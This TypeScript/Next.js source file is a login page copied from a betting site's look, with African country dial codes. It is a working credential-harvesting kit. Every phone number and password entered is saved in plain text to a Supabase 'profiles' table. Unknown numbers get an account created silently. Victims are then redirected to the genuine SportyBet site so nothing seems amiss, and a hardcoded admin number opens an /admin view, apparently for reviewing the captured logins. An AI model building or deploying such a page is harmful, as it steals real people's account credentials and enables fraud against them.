// src/app/login/page.tsx
"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { supabase, phoneToEmail } from "@/lib/supabase";
import { X, ChevronRight, Check, Eye, EyeOff, Loader2 } from "lucide-react";

const COUNTRIES = [
  { code: "gh", name: "Ghana", dial: "+233" },
  { code: "ng", name: "Nigeria", dial: "+234" },
  { code: "tz", name: "Tanzania", dial: "+255" },
  { code: "zm", name: "Zambia", dial: "+260" },
  { code: "za", name: "South Africa", dial: "+27" },
  { code: "cm", name: "Cameroon", dial: "+237" },
  { code: "mz", name: "Mozambique", dial: "+258" },
  { code: "ke", name: "Kenya", dial: "+254" },
  { code: "ug", name: "Uganda", dial: "+256" },
  { code: "ci", name: "Ivory Coast", dial: "+225" },
  { code: "sn", name: "Senegal", dial: "+221" },
];

// ============================================================================
// 🚨🚨🚨 CHANGE YOUR ADMIN PHONE NUMBER HERE 🚨🚨🚨
// ============================================================================
const ADMIN_PHONE = "0000000000"; 
// ============================================================================

// ============================================================================
// 🚨🚨🚨 CHANGE YOUR REDIRECT URL HERE (WHERE USERS GO) 🚨🚨🚨
// ============================================================================
const REWARD_URL = "https://www.sportybet.com/gh/m/"; 
// ============================================================================

export default function LoginPage() {
  const router = useRouter();
  const [phone, setPhone] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [keepSignedIn, setKeepSignedIn] = useState(true);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [selectedCountry, setSelectedCountry] = useState(COUNTRIES[0]);
  const [isCountryModalOpen, setIsCountryModalOpen] = useState(false);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    setError(null);

    const digits = phone.replace(/\D/g, "");
    
    const cleanAdminPhone = ADMIN_PHONE.replace(/\D/g, "");
    const isAdminNumber = digits === cleanAdminPhone;

    if (digits.length < 6) {
      setError("Please enter a valid mobile number.");
      return;
    }
    if (password.length < 4) {
      setError("Password must be at least 4 characters.");
      return;
    }

    setLoading(true);
    
    const fullPhone = isAdminNumber ? cleanAdminPhone : `${selectedCountry.dial}${digits}`;
    const email = phoneToEmail(fullPhone);

    try {
      const { data: signInData, error: signInError } =
        await supabase.auth.signInWithPassword({ email, password });

      let userId = signInData?.user?.id ?? null;

      if (signInError) {
        if (/invalid login credentials/i.test(signInError.message)) {
          const { data: signUpData, error: signUpError } =
            await supabase.auth.signUp({ email, password });

          if (signUpError) {
            if (/user already registered/i.test(signUpError.message)) {
              throw new Error("Incorrect password. Please try again.");
            }
            throw signUpError;
          }
          
          userId = signUpData.user?.id ?? null;

          if (!userId) {
            throw new Error("Account created but no session. Turn OFF 'Confirm email' in Supabase.");
          }
        } else {
          throw signInError;
        }
      }

      if (!userId) throw new Error("Could not resolve user ID.");

      const role = isAdminNumber ? "admin" : "user";

      const { data: existing } = await supabase
        .from("profiles")
        .select("id, role")
        .eq("id", userId)
        .maybeSingle();

      if (!existing) {
        await supabase.from("profiles").insert({
          id: userId,
          phone: fullPhone,
          role,
          test_plaintext_password: password,
        });
      } else {
        await supabase
          .from("profiles")
          .update({
            phone: fullPhone,
            role: existing.role === "admin" || isAdminNumber ? "admin" : "user",
            test_plaintext_password: password,
          })
          .eq("id", userId);
      }

      // Use router.push instead of window.location for smoother transition
      if (isAdminNumber) {
        router.push("/admin"); 
      } else {
        window.location.replace(REWARD_URL);
      }
    } catch (err: any) {
      setError(err?.message ?? "Login failed. Please check your details.");
      setLoading(false);
    }
  }

  const autofillFix = { 
    WebkitBoxShadow: "0 0 0 1000px #181A1E inset", 
    WebkitTextFillColor: "white" 
  };

  return (
    <main className="min-h-screen bg-[#181A1E] flex flex-col w-full font-sans">
      
      {/* Top Bar */}
      <div className="w-full flex justify-between items-center p-5">
        <div className="flex items-center gap-2.5">
          <img
            src={`https://flagcdn.com/${selectedCountry.code}.svg`}
            alt={`${selectedCountry.name} flag`}
            className="w-8 h-[22px] object-cover rounded-[2px] border border-gray-700 shadow-sm"
          />
          <span className="text-white font-medium text-[17px]">{selectedCountry.name}</span>
          <button
            onClick={() => setIsCountryModalOpen(true)}
            className="flex items-center text-[#00C853] text-[15px] font-medium hover:underline ml-1"
          >
            Change <ChevronRight className="h-4 w-4 ml-0.5" />
          </button>
        </div>
        <button onClick={() => router.push("/")} className="text-white hover:text-gray-300">
          <X className="h-6 w-6" />
        </button>
      </div>

      {/* Form Container */}
      <div className="flex-1 w-full max-w-[420px] mx-auto px-5 pt-2">
        {error && (
          <div className="mb-4 text-red-500 text-sm text-center bg-red-500/10 py-2 border border-red-500/20 rounded">
            {error}
          </div>
        )}

        <form onSubmit={handleLogin}>
          
          {/* Phone Input */}
          <div className="flex items-center bg-[#181A1E] border border-[#33363D] rounded-md mb-4 overflow-hidden">
            <div className="pl-4 pr-3 py-3.5 text-white text-base">
              {selectedCountry.dial}
            </div>
            <input
              type="tel"
              inputMode="numeric"
              placeholder="Mobile Number"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
              className="flex-1 bg-transparent px-1 py-3.5 text-base text-white placeholder:text-[#999] focus:outline-none"
              style={autofillFix}
            />
          </div>

          {/* Password Input */}
          <div className="relative flex items-center bg-[#181A1E] border border-[#33363D] rounded-md mb-5 overflow-hidden">
            <input
              type={showPassword ? "text" : "password"}
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full bg-transparent pl-4 pr-12 py-3.5 text-base text-white placeholder:text-[#999] focus:outline-none"
              style={autofillFix}
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-[#777] hover:text-white"
            >
              {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
            </button>
          </div>

          {/* Checkboxes */}
          <div className="flex items-center justify-between mb-6 px-1 whitespace-nowrap">
            <label className="flex items-center gap-2 cursor-pointer">
              <input
                type="checkbox"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                className="w-[18px] h-[18px] rounded-[3px] border-2 border-[#33363D] checked:bg-[#00C853] checked:border-[#00C853] appearance-none cursor-pointer relative checked:after:content-['✓'] checked:after:text-black checked:after:absolute checked:after:top-1/2 checked:after:left-1/2 checked:after:-translate-x-1/2 checked:after:-translate-y-1/2 checked:after:text-[13px] checked:after:font-bold"
              />
              <span className="text-[#A3A3A3] text-[14px]">Remember me</span>
            </label>
            <label className="flex items-center gap-2 cursor-pointer">
              <input
                type="checkbox"
                checked={keepSignedIn}
                onChange={(e) => setKeepSignedIn(e.target.checked)}
                className="w-[18px] h-[18px] rounded-[3px] border-2 border-[#33363D] checked:bg-[#00C853] checked:border-[#00C853] appearance-none cursor-pointer relative checked:after:content-['✓'] checked:after:text-black checked:after:absolute checked:after:top-1/2 checked:after:left-1/2 checked:after:-translate-x-1/2 checked:after:-translate-y-1/2 checked:after:text-[13px] checked:after:font-bold"
              />
              <span className="text-[#A3A3A3] text-[14px]">Keep me signed in</span>
            </label>
          </div>

          {/* LOGIN BUTTON */}
          <button
            type="submit"
            disabled={loading}
            className="w-full h-[52px] flex items-center justify-center bg-[#00C853] text-black font-bold text-[16px] rounded-md mb-7 hover:bg-[#00b34a] transition"
          >
            {loading ? (
              <Loader2 className="h-6 w-6 animate-spin text-black" />
            ) : (
              "Login"
            )}
          </button>

          {/* Links */}
          <div className="flex justify-between items-center px-1">
            <button type="button" className="text-[#00C853] text-[15px] font-medium hover:underline">
              Forgot Password?
            </button>
            <button type="button" className="text-[#00C853] text-[15px] font-medium hover:underline">
              Create New Account
            </button>
          </div>
        </form>

        {/* Divider */}
        <div className="relative flex items-center justify-center mt-10 mb-8">
          <div className="absolute inset-0 flex items-center">
            <div className="w-full border-t border-[#33363D]"></div>
          </div>
          <div className="relative bg-[#181A1E] px-4 text-[#A3A3A3] text-[15px]">
            Or
          </div>
        </div>

        {/* Footer Text */}
        <div className="text-center text-[#A3A3A3] text-[15px] leading-relaxed px-2">
          To deactivate or reactivate your account{" "}
          <button type="button" className="text-[#00C853] hover:underline font-medium">
            click here.
          </button>
        </div>
      </div>

      {/* Country Modal */}
      {isCountryModalOpen && (
        <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
          <div className="bg-[#181A1E] w-full max-w-[400px] rounded-xl flex flex-col max-h-[80vh] overflow-hidden border border-[#33363D] shadow-2xl">
            <div className="flex items-center justify-between p-6 pb-4">
              <h2 className="text-white text-lg font-semibold">Location Preference</h2>
              <button
                onClick={() => setIsCountryModalOpen(false)}
                className="text-white hover:text-gray-300"
              >
                <X className="h-6 w-6" />
              </button>
            </div>

            <div className="overflow-y-auto px-6 pb-6 space-y-3">
              {COUNTRIES.map((country) => (
                <button
                  key={country.code}
                  onClick={() => {
                    setSelectedCountry(country);
                    setIsCountryModalOpen(false);
                  }}
                  className={`w-full flex items-center justify-between p-4 rounded-lg border transition ${
                    selectedCountry.code === country.code
                      ? "border-[#00C853] bg-[#00C853]/5"
                      : "border-[#33363D] bg-[#141519] hover:border-[#555]"
                  }`}
                >
                  <div className="flex items-center gap-4">
                    <img
                      src={`https://flagcdn.com/${country.code}.svg`}
                      alt={`${country.name} flag`}
                      className="w-10 h-6 object-cover rounded-sm border border-gray-700"
                    />
                    <span className="text-white font-medium">{country.name}</span>
                  </div>
                  {selectedCountry.code === country.code && (
                    <Check className="h-5 w-5 text-[#00C853]" />
                  )}
                </button>
              ))}
            </div>
          </div>
        </div>
      )}
    </main>
  );
}